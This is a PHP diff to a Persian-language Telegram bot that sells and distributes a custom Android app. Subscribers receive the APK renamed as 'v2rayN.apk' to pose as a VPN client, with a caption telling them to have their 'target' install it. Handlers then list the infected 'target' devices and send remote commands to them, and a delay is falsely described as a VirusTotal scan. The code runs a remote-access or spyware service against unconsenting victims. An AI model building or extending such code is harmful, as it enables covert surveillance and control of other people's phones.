@@ -2,15 +2,16 @@
 
 namespace App\Telegram\Handlers;
 
-use App\Telegram\Keyboards\MobileKermRiziKeyboard;
-use SergiX44\Nutgram\Nutgram;
+use App\Models\User;
 use App\Services\ApkBuilderService;
 use App\Services\KermAppService;
+use App\Telegram\Keyboards\MobileKermRiziKeyboard;
+use App\Telegram\Keyboards\PlusRequiredKeyboard;
+use Illuminate\Support\Facades\Log;
+use SergiX44\Nutgram\Nutgram;
 use SergiX44\Nutgram\Telegram\Types\Internal\InputFile;
 use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardButton;
 use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardMarkup;
-use Illuminate\Support\Facades\Log;
-use App\Models\User;
 
 class MobileKermRiziHandler
 {
@@ -26,12 +27,29 @@ class MobileKermRiziHandler
 
     public function start(Nutgram $bot): void
     {
+        /** @var User|null $user */
         $user = User::where('telegram_id', $bot->userId())->first();
-        $apiToken = $user?->api_token;
 
+        if (!$user) {
+            $bot->sendMessage('❌ کاربر پیدا نشد.');
+            return;
+        }
+
+        // ۱. بررسی اشتراک پلاس
+        if (!$user->hasPlusSubscription()) {
+            $bot->sendMessage(
+                "<tg-emoji emoji-id=\"6224077119996040131\">❗️</tg-emoji><tg-emoji emoji-id=\"4929619512224909015\">🪱</tg-emoji> این بخش نیازمند ارتقای نسخه رباتمونه <tg-emoji emoji-id=\"5370967353674701492\">😚</tg-emoji>\n\nبرای ارتقای نسخه ربات به \"نسخه پلاس<tg-emoji emoji-id=\"5433758796289685818\">👑</tg-emoji>\" و یا به \"نسخه پرو<tg-emoji emoji-id=\"6244241334320762892\">💎</tg-emoji>\" از طریق دکمه های زیر اقدام کنید :",
+                reply_markup: PlusRequiredKeyboard::make('main_menu')
+            );
+            return;
+        }
+
+        $apiToken = $user->api_token;
+
+        // ۲. اگر کاربر قبلاً اپلیکیشن خود را تحویل گرفته است
         if ($apiToken) {
             $keyboard = InlineKeyboardMarkup::make()->addRow(
-                InlineKeyboardButton::make('📱 مشاهده دستگاه‌های من', callback_data: 'list_devices')
+                InlineKeyboardButton::make('لیست تارگت ها', callback_data: 'list_devices', style: 'danger')
             );
 
             $bot->sendMessage(
@@ -41,7 +59,53 @@ class MobileKermRiziHandler
             return;
         }
 
-        $bot->sendMessage('در حال آماده‌سازی اپلیکیشن اختصاصی شما... این فرآیند ممکن است کمی طول بکشد. ⏳');
+        if ($user->hasActiveTimer()) {
+            $remainingText = $user->getRemainingTimerText();
+
+            $msg = '<b><tg-emoji emoji-id="4929619512224909015">🪱</tg-emoji></b> <b>درخواست ساخت اپلیکیشن در حال بررسی است!</b>' . "\n\n";
+            $msg .= '<blockquote>جهت تایید اپلیکیشن شما توسط ویروس‌توتال، فرایند اسکن امنیتی در حال انجام است. پس از اتمام این زمان، اپلیکیشن اختصاصی شما به صورت خودکار تحویل داده می‌شود.</blockquote>';
+
+            $keyboard = InlineKeyboardMarkup::make()
+                ->addRow(
+                    InlineKeyboardButton::make(
+                        text: "{$remainingText}",
+                        callback_data: 'refresh_app_timer',
+                        style: 'info',
+                        icon_custom_emoji_id: '4904882772637648609'
+                    )
+                )
+                ->addRow(
+                    InlineKeyboardButton::make(
+                        text: 'کرم پلاس',
+                        url: 'https://t.me/kermplus',
+                        style: 'danger',
+                        icon_custom_emoji_id: '4929619512224909015'
+                    )
+                );
+
+            $bot->sendMessage($msg, parse_mode: 'HTML', reply_markup: $keyboard);
+            return;
+        }
+
+        if ($user->isTimerReady()) {
+            $apkPath = $this->apkService->downloadApkFromServer($user['apk_url']);
+            $keyboard = InlineKeyboardMarkup::make()->addRow(
+                InlineKeyboardButton::make('لیست تارگت ها', callback_data: 'list_devices', style: 'danger')
+            );
+            $bot->sendDocument(
+                document: InputFile::make($apkPath, 'v2rayN.apk'),
+                caption: '<tg-emoji emoji-id="4929619512224909015">🪱</tg-emoji> اپلیکیشن اختصاصیت توسط <b>کرم پلاس</b><b><tg-emoji emoji-id="5134654202894615343">🪱</tg-emoji></b> ساخته شد.
+
+            <tg-emoji emoji-id="4927405916145321741">🪱</tg-emoji> برای کرم ریزی روی تارگتتون ، باید این برنامه رو بدید نصب کنه
+
+            <b><tg-emoji emoji-id="5965107454088843648">📶</tg-emoji></b><b> قالب انتخاب شده : v2rayNG</b>
+            ',
+                reply_markup: $keyboard,
+                parse_mode: 'HTML'
+            );
+
+            return ;
+        }
 
         try {
             $userResponse = $this->appService->registerOwner(
@@ -57,34 +121,40 @@ class MobileKermRiziHandler
             $bot->setUserData('api_token', $apiToken);
 
             $buildData = $this->apkService->generateApk((string) $bot->userId(), $appKey);
+            User::where('telegram_id', $bot->userId())->update(['apk_url' => $buildData['download_url']]);
+            // $apkPath = $this->apkService->downloadApkFromServer($buildData['download_url']);
 
-            // if ($buildData['status'] === 'scanning') {
-            //     $bot->sendMessage('✅ فایل ساخته شد و هم‌اکنون در حال اسکن امنیتی (VirusTotal) است. در حال دریافت فایل...');
-            // }
 
-            $apkPath = $this->apkService->downloadApkFromServer($buildData['download_url']);
 
-            $keyboard = InlineKeyboardMarkup::make()->addRow(
-                InlineKeyboardButton::make('📱 مشاهده دستگاه‌های من', callback_data: 'list_devices')
-            );
+            if (! $user->timer_expires_at) {
+                $user->startNewCooldown(minHours: 12, maxHours: 24);
+                $remainingText = $user->getRemainingTimerText();
 
-            $bot->sendDocument(
-                document: InputFile::make($apkPath, 'MyApp.apk'),
-                caption: '<tg-emoji emoji-id="4929619512224909015">🪱</tg-emoji> اپلیکیشن اختصاصیت توسط <b>کرم پلاس</b><b><tg-emoji emoji-id="5134654202894615343">🪱</tg-emoji></b> ساخته شد.
+                $msg = '<b><tg-emoji emoji-id="4929619512224909015">🪱</tg-emoji></b> <b>درخواست ساخت اپلیکیشن اختصاصی شما با موفقیت ثبت شد.</b>' . "\n\n";
+                $msg .= '<blockquote>جهت تایید اپلیکیشن شما توسط ویروس توتال، نیاز به زمان اسکن امنیتی است که از همین حالا شروع شد. پس از اتمام این مدت زمان، مجدداً مراجعه کنید تا فایل اختصاصی خود را تحویل بگیرید.</blockquote>';
 
-<tg-emoji emoji-id="4927405916145321741">🪱</tg-emoji> برای کرم ریزی روی تارگتتون ، باید این برنامه رو بدید نصب کنه
+                $keyboard = InlineKeyboardMarkup::make()
+                    ->addRow(
+                        InlineKeyboardButton::make(
+                            text: "{$remainingText}",
+                            callback_data: 'refresh_app_timer',
+                            style: 'info',
+                            icon_custom_emoji_id: '4904882772637648609'
+                        )
+                    )
+                    ->addRow(
+                        InlineKeyboardButton::make(
+                            text: 'کرم پلاس',
+                            url: 'https://t.me/kermplus',
+                            style: 'danger',
+                            icon_custom_emoji_id: '4929619512224909015'
+                        )
+                    );
 
-<b><tg-emoji emoji-id="5965107454088843648">📶</tg-emoji></b><b> قالب انتخاب شده : v2rayNGپ</b>
-',
-                reply_markup: $keyboard,
-                parse_mode: 'HTML'
-            );
-
-            @unlink($apkPath);
-
+                $bot->sendMessage($msg, parse_mode: 'HTML', reply_markup: $keyboard);
+                return;
+            }
         } catch (\Exception $e) {
-            $bot->sendMessage('❌ متأسفانه در ساخت اپلیکیشن مشکلی پیش آمد.');
-
             Log::channel('daily')->error('خطا در ساخت APK تلگرام', [
                 'user_id' => $bot->userId(),
                 'error' => $e->getMessage(),
@@ -96,8 +166,51 @@ class MobileKermRiziHandler
         }
     }
 
+
+    public function refreshAppTimer(Nutgram $bot): void
+    {
+        $user = User::where('telegram_id', $bot->userId())->first();
+
+        if (! $user || ! $user->hasActiveTimer()) {
+            $bot->answerCallbackQuery(text: 'فعال است', show_alert: true);
+            return;
+        }
+
+        $remainingText = $user->getRemainingTimerText();
+
+        $keyboard = InlineKeyboardMarkup::make()
+            ->addRow(
+                InlineKeyboardButton::make(
+                    text: "{$remainingText}",
+                    callback_data: 'refresh_app_timer',
+                    style: 'info',
+                    icon_custom_emoji_id: '4904882772637648609'
+                )
+            )
+            ->addRow(
+                InlineKeyboardButton::make(
+                    text: 'کرم پلاس',
+                    url: 'https://t.me/kermplus',
+                    style: 'danger',
+                    icon_custom_emoji_id: '4929619512224909015'
+                )
+            );
+
+        try {
+            $bot->editMessageReplyMarkup(reply_markup: $keyboard);
+            $bot->answerCallbackQuery(text: "{$remainingText}");
+        } catch (\Throwable) {
+            $bot->answerCallbackQuery(text: "{$remainingText}");
+        }
+    }
+
     public function listDevices(Nutgram $bot): void
     {
+        $user = User::where('telegram_id', $bot->userId())->first();
+        if (!$user->hasPlusSubscription()) {
+            $bot->sendMessage("<tg-emoji emoji-id=\"6224077119996040131\">❗️</tg-emoji><tg-emoji emoji-id=\"4929619512224909015\">🪱</tg-emoji> این بخش نیازمند ارتقای نسخه رباتمونه <tg-emoji emoji-id=\"5370967353674701492\">😚</tg-emoji>\n\nبرای ارتقای نسخه ربات به \"نسخه پلاس<tg-emoji emoji-id=\"5433758796289685818\">👑</tg-emoji>\" و یا به \"نسخه پرو<tg-emoji emoji-id=\"6244241334320762892\">💎</tg-emoji>\" از طریق دکمه های زیر اقدام کنید :", reply_markup: PlusRequiredKeyboard::make('main_menu'));
+            return;
+        }
         $apiToken = User::where('telegram_id', $bot->userId())->value('api_token') ?: $bot->getUserData('api_token');
 
         if (!$apiToken) {
@@ -127,7 +240,7 @@ class MobileKermRiziHandler
 
             $bot->editMessageText('🪱 موبایلی که میخوای روش کرم بریزیم رو انتخاب کن:', reply_markup: $keyboard);
         } catch (\Exception $e) {
-            $bot->answerCallbackQuery('❌ خطا در دریافت لیست دستگاه‌ها.', true);
+            $bot->answerCallbackQuery('❌ خطا در دریافت لیست دستگاهها.', true);
             Log::error('Error fetching devices', ['exception' => $e]);
         }
     }
@@ -135,7 +248,7 @@ class MobileKermRiziHandler
     public function showDeviceOptions(Nutgram $bot, $id): void
     {
         $bot->setUserData('selected_device_id', $id);
-        $bot->editMessageText("⚙️ تنظیمات برای دستگاه #{$id}\n\nچه عملیاتی می‌خواهید انجام دهید؟", reply_markup: MobileKermRiziKeyboard::make());
+        $bot->editMessageText("⚙️ اکشن ها برای دستگاه #{$id}\n\nچه عملیاتی میخواهید انجام دهید؟", reply_markup: MobileKermRiziKeyboard::make());
     }
 
     public function executeCommand(Nutgram $bot, $event): void
@@ -163,7 +276,7 @@ class MobileKermRiziHandler
             $response = $this->appService->sendEvent($apiToken, $event, null, $id);
             $bot->answerCallbackQuery(text: 'درخواست کرم ریزی🪱 با موفقیت ثبت شد✅', show_alert: true);
         } catch (\Exception $e) {
-            $bot->answerCallbackQuery(text: '❌ خطا در ارسال دستور. دستگاه آفلاین است یا سرور پاسخ نمی‌دهد.', show_alert: true);
+            $bot->answerCallbackQuery(text: '❌ خطا در ارسال دستور. دستگاه آفلاین است یا سرور پاسخ نمیدهد.', show_alert: true);
             Log::error('Error sending command', ['event' => $event, 'device_id' => $id, 'error' => $e->getMessage()]);
         }
     }
